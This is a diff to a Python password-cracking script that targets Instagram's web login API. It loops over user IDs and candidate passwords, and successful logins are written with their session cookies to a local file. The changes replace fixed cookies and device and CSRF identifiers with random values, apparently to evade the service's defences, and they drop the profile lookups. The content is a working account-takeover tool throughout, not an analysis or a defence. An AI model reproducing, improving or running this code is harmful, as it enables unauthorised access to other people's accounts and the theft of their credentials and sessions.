@@ -126,12 +126,12 @@ def crack(uid, pww, total_idz):
             time_now = int(datetime.now().timestamp())
             enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{pw}"
             cookies = {
-                'csrftoken': 'C-0gmeW0GBKNePMGhh4dUW',
-                'dpr': '2.200000047683716',
-                'mid': 'ZsDFggABAAG4Q9ExLC0j_wLhNrEA',
-                'datr': 'gcXAZpWAKx8H7YTJz0OkkknU',
-                'ig_did': 'C2E9E8CB-9BE1-4012-BB25-325BE285835B',
-                'wd': '491x571',}
+                'csrftoken': ''.join(random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(32)),
+                'dpr': f'{round(random.uniform(1.0, 3.0), 1)}',
+                'mid': ''.join(random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(24)),
+                'datr': ''.join(random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(16)),
+                'ig_did': ''.join(random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(36)),
+                'wd': f'{random.randint(300, 1920)}x{random.randint(400, 1080)}',}
             data = {
                 "enc_password": enc_password,
                 'optIntoOneTap': 'false',
@@ -157,12 +157,12 @@ def crack(uid, pww, total_idz):
                 'sec-fetch-site': 'same-origin',
                 'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
                 'x-asbd-id': '129477',
-                'x-csrftoken': 'C-0gmeW0GBKNePMGhh4dUW',
+                'x-csrftoken': ''.join(random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(32)),
                 'x-ig-app-id': '1217981644879628',
                 'x-ig-www-claim': '0',
                 'x-instagram-ajax': '1015763003',
                 'x-requested-with': 'XMLHttpRequest',
-                'x-web-device-id': 'C2E9E8CB-9BE1-4012-BB25-325BE285835B',}
+                'x-web-device-id': ''.join(random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(36)),}
             login_url = 'https://www.instagram.com/api/v1/web/accounts/login/ajax/'
             response = requests.post(login_url, cookies=cookies, headers=headers, data=data)
             if response.status_code == 200:
@@ -170,35 +170,20 @@ def crack(uid, pww, total_idz):
                 if json_response.get('status') == 'ok':
                    if json_response.get('authenticated') == True:
                         session_cookies = response.cookies.get_dict()
-                        username = json_response.get('user', {}).get('username', 'Unknown')
-                        profile_url = f'https://www.instagram.com/{username}/?__a=1'
-                        profile_response = session.get(profile_url, cookies=cookies, headers=headers)
-                        profile_json = profile_response.json()
-                        user_data = profile_json.get('graphql', {}).get('user', {})
-                        followers_count = user_data.get('edge_followed_by', {}).get('count', 'Unknown')
                         print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
-                        print(f"\r\033[1;92m [username] {username}")
-                        print(f"\r\033[1;92m [followers] {followers_count}")
                         print(f"\r\033[1;92m [cookie] {session_cookies}")
-                        open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{username}|{pw}|{session_cookies}\n")
+                        open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{session_cookies}\n")
                         oks.append(uid)
                         return True
                    elif  json_response.get('auth_token'):
                         session_cookies = response.cookies.get_dict()
-                        username = json_response.get('user', {}).get('username', 'Unknown')
-                        profile_url = f'https://www.instagram.com/{username}/?__a=1'
-                        profile_response = session.get(profile_url, cookies=cookies, headers=headers)
-                        profile_json = profile_response.json()
-                        user_data = profile_json.get('graphql', {}).get('user', {})
-                        followers_count = user_data.get('edge_followed_by', {}).get('count', 'Unknown')
                         print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
-                        print(f"\r\033[1;92m [username] {username}")
-                        print(f"\r\033[1;92m [followers] {followers_count}")
                         print(f"\r\033[1;92m [cookie] {session_cookies}")
-                        open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{username}|{pw}|{session_cookies}\n")
+                        open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{session_cookies}\n")
                         oks.append(uid)
                         return True
             else:
+                print(f"\r\033[1;91m [ERROR] - Status code {response.status_code}")
                 continue
         loop+=1
     except ConnectionError:
